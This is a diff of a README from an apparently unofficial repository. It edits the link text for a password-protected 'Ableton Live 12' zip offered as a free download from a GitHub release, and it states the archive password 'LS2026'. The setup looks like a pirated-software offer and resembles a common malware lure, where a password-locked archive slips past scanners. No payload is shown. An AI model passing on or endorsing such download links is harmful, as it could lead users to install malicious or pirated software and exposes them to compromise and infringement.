@@ -21,7 +21,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete Ableton Live 12 package – extract and start producing music instantly.  
 
-📥 [Download `Ableton-Live-12-Suite-2026.zip`](https://github.com/skulldxss/Ableton-Live-12-Desktop/releases/download/Music-Production/Ableton-12-Setup.zip)  
+📥 [Download `Ableton-Live-12.zip`](https://github.com/skulldxss/Ableton-Live-12-Desktop/releases/download/Music-Production/Ableton-12-Setup.zip)  
 🔐 `LS2026`
 ---
 
